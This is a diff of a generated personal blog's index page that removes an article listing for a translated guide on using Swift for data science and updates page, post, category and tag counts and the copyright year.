-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/37730/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/37730/" class="post-title-link" itemprop="url">【翻译】使用Swift语言来进行数据科学研究的指南</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-11-29 23:06:56" itemprop="dateCreated datePublished" datetime="2019-11-29T23:06:56+08:00">2019-11-29</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-12-01 18:37:23" itemprop="dateModified" datetime="2019-12-01T18:37:23+08:00">2019-12-01</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/37730/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/37730/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p><img src="https://imgs.codewoody.com/uploads/big/b5e001b9f8a4d9dafcd5ec496a58de85.jpg"></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/37730/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2333,7 +2474,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">108</span>
+                    <span class="site-state-item-count">115</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2376,7 +2517,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2503,7 +2646,15 @@
                     
                       
                     
-                    <span class="site-state-item-count">55</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">59</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -2589,7 +2740,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
@@ -3091,11 +3242,11 @@
       
     
       
-    
-      
-    
-      
         
+      
+    
+      
+    
       
     
       
